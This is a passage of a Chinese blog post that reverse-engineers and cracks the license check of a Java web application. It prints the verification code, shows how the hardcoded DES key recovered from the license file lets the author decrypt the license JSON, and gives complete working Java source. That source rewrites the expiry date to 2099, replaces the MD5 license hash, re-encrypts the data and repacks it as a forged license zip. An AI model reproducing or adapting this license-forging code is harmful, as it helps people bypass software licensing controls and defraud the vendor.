class="string">&quot;concurrentFlag：&quot;</span> + concurrentFlag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">mac1</span> <span class="operator">=</span> <span class="string">&quot;FA-16-3E-14-0C-14&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">licensecode1</span> <span class="operator">=</span> MD5.md5(mac1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">src1</span> <span class="operator">=</span> company + licensecode1 + software + hrmnum + expiredate + concurrentFlag;</span><br><span class="line">        <span class="type">String</span> <span class="variable">src_md5</span> <span class="operator">=</span> MD5.md5(src1);</span><br><span class="line">        System.out.println(<span class="string">&quot;src_md5：&quot;</span> + src_md5);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;授权截止时间：&quot;</span> + expiredate);</span><br><span class="line">        <span class="keyword">if</span> (expiredate.compareTo(DateUtils.getDate()) &gt;= <span class="number">0</span> &amp;&amp; isLegalDate(expiredate)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">MacTools</span>()).getMac();</span><br><span class="line">            <span class="type">String</span> <span class="variable">licensecode</span> <span class="operator">=</span> MD5.md5(mac);</span><br><span class="line">            <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> company + licensecode + software + hrmnum + expiredate + concurrentFlag;</span><br><span class="line">            System.out.println(<span class="string">&quot;src：&quot;</span> + src);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ln.equals(MD5.md5(src))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mac = <span class="string">&quot;FA-16-3E-14-0C-14&quot;</span>;</span><br><span class="line">                licensecode = MD5.md5(mac);</span><br><span class="line">                src = company + licensecode + software + hrmnum + expiredate + concurrentFlag;</span><br><span class="line">                <span class="keyword">return</span> ln.equals(MD5.md5(src));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="读取license文件字节数据"><a href="#读取license文件字节数据" class="headerlink" title="读取license文件字节数据:"></a>读取license文件字节数据:</h2><p>license文件是以<code>.license</code>结尾的,其实它是一个zip文件。<br>修改其后缀为<code>.zip</code>后打开，可以看到里面有3个文件</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808144323.png" alt="20200808144323"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入是licensefilepath</span></span><br><span class="line"><span class="type">byte</span>[] publicKey = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;publicKey&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] licenseRSA = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;license&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] licenseInfoDES = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;licenseInfo&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>getZipSomeByte</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getZipSomeByte(String paramString1, String paramString2) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">localFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(paramString1);</span><br><span class="line">    <span class="type">byte</span>[] arrayOfByte = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!localFile.exists()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;指定的解压文件不存在：\t&quot;</span> + paramString1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ZipFile</span> <span class="variable">localZipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(localFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">localEnumeration</span> <span class="operator">=</span> localZipFile.getEntries();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(localEnumeration.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">ZipArchiveEntry</span> <span class="variable">localZipArchiveEntry</span> <span class="operator">=</span> (ZipArchiveEntry)localEnumeration.nextElement();</span><br><span class="line">            <span class="keyword">if</span> (paramString2.equals(localZipArchiveEntry.getName())) &#123;</span><br><span class="line">                arrayOfByte = org.apache.commons.io.IOUtils.toByteArray(localZipFile.getInputStream(localZipArchiveEntry)); <span class="comment">// 重点</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        localZipFile.close();</span><br><span class="line">        <span class="keyword">return</span> arrayOfByte;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个函数将压缩文件的子文件的字节数据读取出来.</p>
<blockquote>
<p>ZipEntry：<br>   在每一个压缩文件中都会存在多个子文件，那么这每一个的子文件在JAVA中就使用ZipEntry表示。</p>
</blockquote>
<p>打印出它的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;publicKey：&quot;</span> + publicKey);</span><br><span class="line">System.out.println(<span class="string">&quot;licenseRSA：&quot;</span> + licenseRSA);</span><br><span class="line">System.out.println(<span class="string">&quot;licenseInfoDES：&quot;</span> + licenseInfoDES);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicKey：[B@64cee07</span><br><span class="line">licenseRSA：[B@<span class="number">1761e840</span></span><br><span class="line">licenseInfoDES：[B@6c629d6e</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程:"></a>解密流程:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line"><span class="type">byte</span>[] publicKey = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;publicKey&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] licenseRSA = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;license&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] licenseInfoDES = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;licenseInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] license = RSACoder.decryptByPublicKey(licenseRSA, publicKey);   <span class="comment">// 1.通过公钥解密</span></span><br><span class="line"><span class="type">byte</span>[] licenseTypeId = ArrayUtils.addAll(license, <span class="string">&quot;kensite2&quot;</span>.getBytes()); <span class="comment">// 2.计算出对称加密的秘钥</span></span><br><span class="line"><span class="type">byte</span>[] licenseInfo = DESCoder.decrypt(licenseInfoDES, licenseTypeId);  <span class="comment">// 重点!!! 3.用秘钥继续对称解密获取`licenseInfo`</span></span><br></pre></td></tr></table></figure>

<p>步骤:</p>
<ol>
<li>通过公钥解密</li>
<li>计算出对称加密的秘钥</li>
<li>用秘钥继续对称解密获取<code>licenseInfo</code></li>
</ol>
<p>重点在于,它这里对称加密的秘钥泄露了。<br>也就是说我们可以修改<code>licenseInfo</code>后用同样的密码进行对称加密回去</p>
<hr>
<h2 id="修改licenseInfo"><a href="#修改licenseInfo" class="headerlink" title="修改licenseInfo:"></a>修改licenseInfo:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonLicense</span> <span class="operator">=</span> JSONObject.fromObject(<span class="keyword">new</span> <span class="title class_">String</span>(licenseInfo));</span><br><span class="line">System.out.println(jsonLicense);</span><br><span class="line">jsonLicense.put(<span class="string">&quot;expiredate&quot;</span>, <span class="string">&quot;2099-07-30&quot;</span>);  <span class="comment">// 修改截止日期</span></span><br><span class="line">jsonLicense.put(<span class="string">&quot;license&quot;</span>, <span class="string">&quot;181a6d92ed577598d504369308377bba&quot;</span>);  <span class="comment">// 修改license,这个是后面要做一次md5验证</span></span><br><span class="line">System.out.println(jsonLicense);</span><br><span class="line"><span class="type">String</span> <span class="variable">j_license</span> <span class="operator">=</span> jsonLicense.toString();</span><br><span class="line"><span class="type">byte</span>[] byte_license = j_license.getBytes();</span><br><span class="line"><span class="type">byte</span>[] new_licenseInfoDES = DESCoder.encrypt(byte_license, licenseTypeId); <span class="comment">//对称加密回去</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改前</span></span><br><span class="line">&#123;<span class="string">&quot;company&quot;</span>:<span class="string">&quot;KYEEXPRESS&quot;</span>,<span class="string">&quot;license&quot;</span>:<span class="string">&quot;b7ee002bf413383d3db04a2c1bd4739a&quot;</span>,<span class="string">&quot;software&quot;</span>:<span class="string">&quot;ALL&quot;</span>,<span class="string">&quot;hrmnum&quot;</span>:<span class="string">&quot;99999&quot;</span>,<span class="string">&quot;expiredate&quot;</span>:<span class="string">&quot;2020-07-30&quot;</span>,<span class="string">&quot;concurrentFlag&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"><span class="comment">//修改后</span></span><br><span class="line">&#123;<span class="string">&quot;company&quot;</span>:<span class="string">&quot;KYEEXPRESS&quot;</span>,<span class="string">&quot;license&quot;</span>:<span class="string">&quot;181a6d92ed577598d504369308377bba&quot;</span>,<span class="string">&quot;software&quot;</span>:<span class="string">&quot;ALL&quot;</span>,<span class="string">&quot;hrmnum&quot;</span>:<span class="string">&quot;99999&quot;</span>,<span class="string">&quot;expiredate&quot;</span>:<span class="string">&quot;2099-07-30&quot;</span>,<span class="string">&quot;concurrentFlag&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在,我们要把<code>byte数组</code>的<code>new_licenseInfoDES</code>还原为文件</p>
<hr>
<h2 id="数据还原为文件"><a href="#数据还原为文件" class="headerlink" title="数据还原为文件"></a>数据还原为文件</h2><p>这一步花了我比较长的时间。现在的目的:需要将<code>byte数组</code>转化成<code>ZipArchiveEntry</code>，这里面主要涉及到的知识点:<code>Java文件IO流的操作</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.compress.archivers.zip.ZipArchiveEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.IOUtils;</span><br></pre></td></tr></table></figure>

<p>由于它这里用的是第三方的压缩模块<code>org.apache.commons</code>,所以我们要先熟悉一下这个模块的用法。</p>
<hr>
<h3 id="org-apache-commons-Demo函数"><a href="#org-apache-commons-Demo函数" class="headerlink" title="org.apache.commons Demo函数:"></a>org.apache.commons Demo函数:</h3><p>参考了这个<a href="https://blog.csdn.net/top_code/article/details/40505523">Apache Commons Compress例子</a></p>
<p>先熟悉一下这个模块的用法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeZip</span><span class="params">(File srcFile, File destFile, String name)</span> &#123;</span><br><span class="line"> </span><br><span class="line">		<span class="type">ZipArchiveOutputStream</span> <span class="variable">zipOutput</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			zipOutput = <span class="keyword">new</span> <span class="title class_">ZipArchiveOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(  <span class="comment">//压缩输出流</span></span><br><span class="line">					destFile));</span><br><span class="line"> </span><br><span class="line">			in = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile)); <span class="comment">// 文件输入流-&gt;BufferedInputStream</span></span><br><span class="line"> </span><br><span class="line">			<span class="type">ZipArchiveEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">if</span> (name != <span class="literal">null</span> &amp;&amp; name.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				entry = <span class="keyword">new</span> <span class="title class_">ZipArchiveEntry</span>(name);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				entry = <span class="keyword">new</span> <span class="title class_">ZipArchiveEntry</span>(srcFile.getName());</span><br><span class="line">			&#125;</span><br><span class="line"> </span><br><span class="line">			entry.setSize(srcFile.length());</span><br><span class="line"> </span><br><span class="line">			zipOutput.putArchiveEntry(entry);</span><br><span class="line"> </span><br><span class="line">			<span class="keyword">final</span> <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">			<span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">				zipOutput.write(buffer, <span class="number">0</span>, len); <span class="comment">// 写入</span></span><br><span class="line">			&#125;</span><br><span class="line">			zipOutput.closeArchiveEntry();</span><br><span class="line"> </span><br><span class="line">			<span class="comment">//可继续添加 文件</span></span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					in.close();</span><br><span class="line">				&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (zipOutput != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					zipOutput.close();</span><br><span class="line">				&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的作用:文件-&gt;压缩文件</p>
<p>当中涉及到的流:<code>FileInputStream</code>-&gt;<code>BufferedInputStream</code>-&gt;<code>ZipArchiveOutputStream</code></p>
<p>我们的目的是把<code>Byte[]</code> -&gt;<code>ZipArchiveOutputStream</code></p>
<hr>
<h3 id="简单修改"><a href="#简单修改" class="headerlink" title="简单修改:"></a>简单修改:</h3><p>对这个函数做简单的修改。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mywriteZip</span><span class="params">(<span class="type">byte</span>[] paramArrayOfByte, File destFile, String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ZipArchiveOutputStream</span> <span class="variable">zipOutput</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zipOutput = <span class="keyword">new</span> <span class="title class_">ZipArchiveOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(</span><br><span class="line">                    destFile));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            in = new BufferedInputStream(new FileInputStream(srcFile));</span></span><br><span class="line"></span><br><span class="line">            <span class="type">ZipArchiveEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 子文件</span></span><br><span class="line">            <span class="keyword">if</span> (name != <span class="literal">null</span> &amp;&amp; name.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                entry = <span class="keyword">new</span> <span class="title class_">ZipArchiveEntry</span>(name);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            else &#123;</span></span><br><span class="line"><span class="comment">//                entry = new ZipArchiveEntry(srcFile.getName());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            entry.setSize(paramArrayOfByte.length());</span></span><br><span class="line"></span><br><span class="line">            zipOutput.putArchiveEntry(entry); <span class="comment">// 在压缩文件中，每一个压缩的内容都可以用一个ZipEntry表示，所以在进行压缩之前必须通过putArchiveEntry方法设置一个ZipEntry</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            final byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">//            int len = 0;</span></span><br><span class="line"><span class="comment">//            while ((len = in.read(buffer)) != -1) &#123;</span></span><br><span class="line"><span class="comment">//                zipOutput.write(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(paramArrayOfByte), zipOutput);  <span class="comment">//重点!!! IOUtils.copy(in,out)方法拷贝流</span></span><br><span class="line"></span><br><span class="line">            zipOutput.closeArchiveEntry();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//可继续添加文件</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            if (in != null) &#123;</span></span><br><span class="line"><span class="comment">//                try &#123;</span></span><br><span class="line"><span class="comment">//                    in.close();</span></span><br><span class="line"><span class="comment">//                &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">if</span> (zipOutput != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    zipOutput.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点是这一句代码:</p>
<p><code>IOUtils.copy(new ByteArrayInputStream(paramArrayOfByte), zipOutput);  </code></p>
<p>用了<code>IOUtils.copy</code>方法,将<code>ByteArrayInputStream</code>copy给了<code>ZipArchiveOutputStream</code></p>
<blockquote>
<p>这里面涉及到了java的流概念,由于不熟,所以搞得比较久。看来基础知识还是很重要的，处处涉及到。</p>
</blockquote>
<p>现在，用这个函数就可以满足我们的需求了。</p>
<hr>
<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] new_licenseInfoDES = DESCoder.encrypt(byte_license, licenseTypeId);</span><br><span class="line">System.out.println(<span class="string">&quot;new_licenseInfoDES：&quot;</span> + new_licenseInfoDES);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过字符串打印出来</span><br><span class="line">new_licenseInfoDES：[B@57f23557</span><br></pre></td></tr></table></figure>

<p>本以为可以直接通过字符串转成文件就好，结果发现还是无法验证通过。</p>
<p>用<code>winhex</code>工具对比了一下,不正确的文件的发现内容明显少了很多</p>
<p>这是正确的文件,通过<code>winhex</code>的结果:<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200808162814.png" alt="20200808162814"></p>
<p>后面找到了原因:</p>
<blockquote>
<p>加密后的byte数组是不能强制转换成字符串的, 换言之,字符串和byte数组在这种情况下不是互逆的</p>
</blockquote>
<p>所以要直接<code>byte数组</code>-&gt;文件</p>
<hr>
<h2 id="md5验证部分"><a href="#md5验证部分" class="headerlink" title="md5验证部分:"></a>md5验证部分:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (expiredate.compareTo(DateUtils.getDate()) &gt;= <span class="number">0</span> &amp;&amp; isLegalDate(expiredate)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">MacTools</span>()).getMac();</span><br><span class="line">    <span class="type">String</span> <span class="variable">licensecode</span> <span class="operator">=</span> MD5.md5(mac);</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> company + licensecode + software + hrmnum + expiredate + concurrentFlag;</span><br><span class="line">    System.out.println(<span class="string">&quot;src：&quot;</span> + src);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ln.equals(MD5.md5(src))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mac = <span class="string">&quot;FA-16-3E-14-0C-14&quot;</span>;</span><br><span class="line">        licensecode = MD5.md5(mac);</span><br><span class="line">        src = company + licensecode + software + hrmnum + expiredate + concurrentFlag;</span><br><span class="line">        <span class="keyword">return</span> ln.equals(MD5.md5(src));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有个<code>md5</code>验证的过程,这个过程比较简单,根据代码自己生成对应的新的<code>md5</code>值就好了</p>
<hr>
<h2 id="破解license"><a href="#破解license" class="headerlink" title="破解license:"></a>破解license:</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><p>完整源码如下:</p>
<p>生成新证书的函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">g_license</span><span class="params">(String licensefilepath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;licensefilepath：&quot;</span> + licensefilepath);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] publicKey = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;publicKey&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] licenseRSA = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;license&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] licenseInfoDES = Zip.getZipSomeByte(licensefilepath, <span class="string">&quot;licenseInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;publicKey：&quot;</span> + publicKey);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseRSA：&quot;</span> + licenseRSA);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseInfoDES：&quot;</span> + licenseInfoDES);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] license = RSACoder.decryptByPublicKey(licenseRSA, publicKey);   <span class="comment">// 用公钥解密</span></span><br><span class="line">        <span class="type">byte</span>[] licenseTypeId = ArrayUtils.addAll(license, <span class="string">&quot;kensite2&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] licenseInfo = DESCoder.decrypt(licenseInfoDES, licenseTypeId);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;license：&quot;</span> + license);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseTypeId：&quot;</span> + licenseTypeId);</span><br><span class="line">        System.out.println(<span class="string">&quot;licenseInfo：&quot;</span> + licenseInfo);</span><br><span class="line">        System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonLicense</span> <span class="operator">=</span> JSONObject.fromObject(<span class="keyword">new</span> <span class="title class_">String</span>(licenseInfo));</span><br><span class="line">        System.out.println(jsonLicense);</span><br><span class="line">        jsonLicense.put(<span class="string">&quot;expiredate&quot;</span>, <span class="string">&quot;2099-07-30&quot;</span>);  <span class="comment">// 修改截止日期</span></span><br><span class="line">        jsonLicense.put(<span class="string">&quot;license&quot;</span>, <span class="string">&quot;181a6d92ed577598d504369308377bba&quot;</span>);  <span class="comment">// 修改license</span></span><br><span class="line">        System.out.println(jsonLicense);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">j_license</span> <span class="operator">=</span> jsonLicense.toString();</span><br><span class="line">        <span class="type">byte</span>[] byte_license = j_license.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] new_licenseInfoDES = DESCoder.encrypt(byte_license, licenseTypeId);</span><br><span class="line">        System.out.println(<span class="string">&quot;new_licenseInfoDES：&quot;</span> + new_licenseInfoDES);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line"><span class="comment">//        String new_licenseInfoDES_str = new String(new_licenseInfoDES, &quot;utf-8&quot;);</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\1.Work\\KYESecurity\\1.应用安全\\DevSecOps\\CodeAudit\\secidea_webapps\\webapps\\secidea\\1_pojie\\secidea1\\new_zip.zip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        mywriteZip(new_licenseInfoDES, destFile, <span class="string">&quot;licenseInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;packToolFile&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">company</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;company&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ln</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;license&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">software</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;software&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hrmnum</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;hrmnum&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">expiredate</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;expiredate&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">concurrentFlag</span> <span class="operator">=</span> jsonLicense.getString(<span class="string">&quot;concurrentFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;授权公司：&quot;</span> + company);</span><br><span class="line">        System.out.println(<span class="string">&quot;license：&quot;</span> + ln);</span><br><span class="line">        System.out.println(<span class="string">&quot;software：&quot;</span> + software);</span><br><span class="line">        System.out.println(<span class="string">&quot;hrmnum：&quot;</span> + hrmnum);</span><br><span class="line">        System.out.println(<span class="string">&quot;concurrentFlag：&quot;</span> + concurrentFlag);</span><br><span class="line">        System.out.println(<span class="string">&quot;授权截止时间：&quot;</span> + expiredate);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>byte数组转为zip文件的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mywriteZip</span><span class="params">(<span class="type">byte</span>[] paramArrayOfByte, File destFile, String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ZipArchiveOutputStream</span> <span class="variable">zipOutput</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zipOutput = <span class="keyword">new</span> <span class="title class_">ZipArchiveOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(</span><br><span class="line">                    destFile));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            in = new BufferedInputStream(new FileInputStream(srcFile));</span></span><br><span class="line"></span><br><span class="line">            <span class="type">ZipArchiveEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (name != <span class="literal">null</span> &amp;&amp; name.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                entry = <span class="keyword">new</span> <span class="title class_">ZipArchiveEntry</span>(name);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            else &#123;</span></span><br><span class="line"><span class="comment">//                entry = new ZipArchiveEntry(srcFile.getName());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            entry.setSize(paramArrayOfByte.length());</span></span><br><span class="line"></span><br><span class="line">            